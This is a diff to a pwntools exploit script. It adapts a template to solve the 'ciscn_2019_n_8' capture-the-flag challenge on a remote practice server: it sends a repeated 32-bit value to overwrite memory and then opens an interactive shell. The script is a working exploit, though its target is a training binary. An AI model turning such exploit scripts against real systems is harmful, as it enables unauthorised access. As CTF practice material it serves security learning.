@@ -1,17 +1,17 @@
 from pwn import * 
-from pwn import p64
+from pwn import p32
 
 
-debug = 1
-gdb_is = 1
+debug = 0
+gdb_is = 0
 # context(arch='i386',os = 'linux', log_level='DEBUG')
 context(arch='amd64',os = 'linux', log_level='DEBUG')
 if debug:
     context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
-    r = process("./pwn")
+    r = process("./ciscn_2019_n_8")
 else:
     host = "node4.buuoj.cn"
-    r = connect(host,30709)#远程连接
+    r = connect(host,26602)#远程连接
     gdb_is =0
 
 if gdb_is:
@@ -23,7 +23,6 @@ if gdb_is:
 # libc = ELF('./libc-2.31.so')
 # elf = ELF('./vuln')
 
-# r.sendlineafter()
-# r.send()
-# r.recvuntil()
+r.sendlineafter(b'name?',p32(17)*14)
+
 r.interactive()
